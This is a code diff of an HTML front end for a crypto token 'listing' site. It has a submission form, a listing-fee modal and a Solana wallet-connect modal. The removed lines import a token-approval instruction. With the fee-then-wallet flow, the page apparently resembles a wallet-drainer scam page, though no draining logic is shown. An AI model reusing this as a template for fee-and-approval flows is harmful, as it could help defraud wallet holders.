@@ -2,77 +2,82 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Crypto Project Listing</title>
-  <link rel="stylesheet" href="List.css">
-
-  <!-- Ethers.js -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-
-  <!-- WalletConnect EthereumProvider -->
-  <script type="module">
-    import { EthereumProvider } from "https://unpkg.com/@walletconnect/ethereum-provider@2.12.1/dist/index.umd.js";
-    window.EthereumProvider = EthereumProvider;
-
-    import {
-      Connection, PublicKey, Transaction
-    } from "https://esm.sh/@solana/web3.js@1.95.3";
-    import {
-      createApproveInstruction, TOKEN_PROGRAM_ID, getAssociatedTokenAddress
-    } from "https://esm.sh/@solana/spl-token@0.3.8";
-    import {
-      PhantomWalletAdapter, SolflareWalletAdapter, BackpackWalletAdapter, GlowWalletAdapter
-    } from "https://esm.sh/@solana/wallet-adapter-wallets@0.19.19";
-
-    window.SolanaDeps = {
-      Connection, PublicKey, Transaction,
-      createApproveInstruction, TOKEN_PROGRAM_ID, getAssociatedTokenAddress,
-      PhantomWalletAdapter, SolflareWalletAdapter, BackpackWalletAdapter, GlowWalletAdapter
-    };
-  </script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SPL Token Project Listing</title>
+  <link rel="stylesheet" href="List/List.css">
+  
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+  <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
 </head>
 <body>
+
+  <video class="video-bg" autoplay muted loop playsinline>
+    <source src="List/animatealpha.mp4" type="video/mp4">
+  </video>
+
   <main class="page">
     <form id="projectForm" class="card">
-      <h2>Submit Your Project</h2>
+      <h2>Submit Your SPL Token</h2>
+      
       <div class="grid">
-        <input placeholder="Project Name" required />
-        <input placeholder="Project Symbol" required />
+        <input type="text" id="projectName" placeholder="Token Name (e.g., Solana)" required />
+        <input type="text" id="projectSymbol" placeholder="Token Symbol (e.g., SOL)" required />
+
         <select required>
           <option value="">Select Chain</option>
           <option>Ethereum</option>
           <option>BNB Chain</option>
+          <option>Solana</option>
           <option>Polygon</option>
           <option>Arbitrum</option>
-          <option>Solana</option>
         </select>
-        <input placeholder="Contract Address" required />
-        <input placeholder="Total Supply" />
-        <input placeholder="Circulating Supply" />
+        
+        <select id="solanaNetwork" required>
+          <option value="mainnet-beta">Mainnet Beta</option>
+          <option value="devnet">Devnet</option>
+          <option value="testnet">Testnet</option>
+        </select>
+        
+        <input type="text" id="mintAddress" placeholder="Token Mint Address" required />
+        <input type="number" id="totalSupply" placeholder="Total Supply" step="any" />
+        <input type="number" id="circulatingSupply" placeholder="Circulating Supply" step="any" />
       </div>
-      <textarea placeholder="Other necessary information"></textarea>
+
+      <textarea id="additionalInfo" placeholder="Other necessary information (Community links, Dex tools, etc.)"></textarea>
+      
       <div class="grid">
-        <input placeholder="Developer Name" required />
-        <input type="email" placeholder="Developer Email" required />
+        <input type="text" id="devName" placeholder="Developer Name" required />
+        <input type="email" id="devEmail" placeholder="Developer Email" required />
       </div>
-      <button type="submit" class="btn-primary">Submit</button>
+      
+      <button type="submit" class="btn-primary">Submit Project</button>
     </form>
   </main>
 
   <div id="feeModal" class="modal hidden">
     <div class="modal-content">
       <span class="close">&times;</span>
-      <p>A verification fee is required to list your project on The Void List.</p>
-      <button id="proceedButton">Proceed to Payment</button>
+      <h3>Listing Fee Required</h3>
+      <p>You need to pay a listing fee to submit your SPL token to the platform.</p>
+      <button id="proceedButton" class="btn-primary">Proceed to Payment</button>
     </div>
   </div>
 
   <div id="walletModal" class="modal hidden">
     <div class="modal-content">
       <span class="close">&times;</span>
-      <p>Select your wallet:</p>
-      <!-- Only two buttons -->
-      <button id="walletConnectEvmButton" class="wallet-btn hidden">WalletConnect (EVM)</button>
-      <button id="solanaWalletButton" class="wallet-btn hidden">Solana Wallets</button>
+      <h3>Connect Solana Wallet</h3>
+      <p>Choose your preferred connection method:</p>
+      
+      <button id="browserWalletButton" class="wallet-btn">
+        <span class="wallet-icon solana-native"></span>
+        SPL Browser Wallet / App
+      </button>
+      
+      <button id="walletConnectButton" class="wallet-btn">
+        <span class="wallet-icon walletconnect"></span>
+        WalletConnect (Mobile QR)
+      </button>
     </div>
   </div>
 
